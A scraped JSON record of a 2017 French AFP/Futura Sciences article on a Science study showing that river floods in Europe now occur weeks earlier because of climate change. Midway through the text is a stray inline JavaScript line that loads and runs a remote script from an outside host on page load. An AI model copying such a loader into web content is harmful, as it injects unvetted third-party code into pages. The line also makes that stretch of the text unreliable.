{"title": "Inondations : des crues de plus en plus précoces en Europe", "newspaper": "Futura Sciences", "author": "AFP WASHINGTON", "date_publi": "14/08/2017", "content": "Le réchauffement climatique altère les crues des fleuves et des rivières à travers l'Europe, menaçant les activités agricoles et les infrastructures sur l'ensemble du continent, révèle une vaste étude. La moitié des crues en Europe de l'ouest avaient une quinzaine de jours d'avance. Les risques de crues pourraient être multipliés par vingt d'ici la fin du siècle. Ce qu'il faut retenir En Europe, les crues se produisent avec plusieurs semaines d’avance, notamment dans l’ouest et le nord-est du vieux continent. La vaste étude couvrant plus de 50 ans montre que les crues des rivières  « est sensible au climat à une large échelle dans le nord-ouest de l’Europe » . Ces changements peuvent affecter les rendements agricoles, la sécurité des infrastructures, la production hydroélectrique ainsi que l’alimentation en eau. Les pertes annuelles moyennes sont estimées à 104 milliards de dollars. Une étude d'une ampleur sans précédent, sur une cinquantaine d'années, montre que les crues se produisent désormais avec plusieurs semaines d'avance dans l'ouest et le nord-est de l'Europe. En Suède, en Finlande et dans les pays baltes, les crues interviennent souvent un mois plus tôt que dans les années 1960 et 1970. Ceci s'explique par la  fonte  plus précoce des neiges en raison du  réchauffement climatique . L'équipe menée par Günter Blöschl, directeur de l'Institut d'ingénierie hydraulique et de gestion des ressources en eau de l'université de technologie de Vienne, en Autriche, a analysé les données recueillies dans plus de 4.200 stations hydrométriques dans 38 pays européens entre 1960 et 2010. Ils ont aussi comparé les  précipitations , l'humidité des sols et les relevés de températures pour détecter les déclencheurs potentiels de ces changements dans les périodes de crues. Voir aussi : Les inondations extrêmes vont augmenter en Europe d’ici 2050 « Nous n'avons pas examiné l'amplitude des  inondations  pendant ces cinquante ans mais la période durant laquelle elles se produisent généralement dans l'année [...] et dans quelle mesure cela a changé entre 1960 et 2010 , a précisé le professeur Blöshl lors d'une conférence de presse téléphonique.  Nos résultats mettent en évidence l'existence d'une signature claire du changement climatique dans les observations des crues à l'échelle européenne [...]. Mais l'impact diffère selon les parties du continent » , a-t-il conclu. Les changements les plus importants se sont produits en Europe de l'ouest, le long de la côte atlantique entre le Portugal et l' Angleterre , où la moitié des stations hydrométriques ont enregistré des crues avec au moins quinze jours d'avance. Cela s'expliquerait par une plus grande humidité du sol, alors que dans le nord-est de l'Europe, c'est la fonte des neiges qui se produit désormais au tout début du printemps. Le réchauffement climatique altère les crues des fleuves et des rivières à travers l’Europe, selon les conclusions d’une vaste étude qui vient de paraître dans la revue américaine  Science . © AFP photo, Bertrand Guay                               Des risques de crues multipliés par 20 d’ici la fin du XXI e  siècle « Cette nouvelle étude suggère que la crue des rivières est sensible au  climat  à une large échelle dans le nord-ouest de l'Europe et procure de nouvelles informations sur ce changement dans la dynamique des  inondations , a pointé Jamie Hannaford, un scientifique du  Centre for Ecology and Hydrology  en Grande-Bretagne, un des principaux coauteurs de l'étude publiée le 10 août dans  Science .  Nous devons continuer à surveiller les périodes des crues et les pics ainsi que leurs fréquences » , a-t-il poursuivi.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  De tels changements dans la saisonnalité des crues peuvent profondément affecter les rendements agricoles, la sécurité des infrastructures et la production hydroélectrique, ainsi que l'alimentation en eau, soulignent Louise Slater et Robert Wilby, respectivement géographe et professeur d'hydroclimatique à l'université de Loughborough au Royaume-Uni, dans un éditorial de la revue  Science . Voir aussi : Élévation du niveau de la mer : le risque d’inondation des côtes va doubler Les  inondations  de rivières en crue affectent un nombre plus important de personnes dans le monde que tout autre désastre naturel, avec des pertes annuelles moyennes estimées à 104 milliards de dollars. Les coûts devraient continuer à augmenter à mesure que le changement climatique intensifie le cycle hydrologique et que la population augmente dans les plaines inondables. Le risque de crues dévastatrices pourrait être multiplié par vingt d'ici la fin du XXI e  siècle, rendant indispensables  « une amélioration des données et des estimations du changement saisonnier des  inondations  » , préviennent les deux scientifiques. L'histoire du réchauffement climatique en 35 secondes                       En intégrant graphiquement les mesures de températures dans presque tous les pays du Globe entre 1900 et 2016, cette animation montre de façon saisissante l’augmentation du nombre d'« anomalies de température », donc des écarts par rapport à une moyenne. On constate qu'en un peu plus d'un siècle, la proportion vire au rouge.                                       ", "theme": "planete"}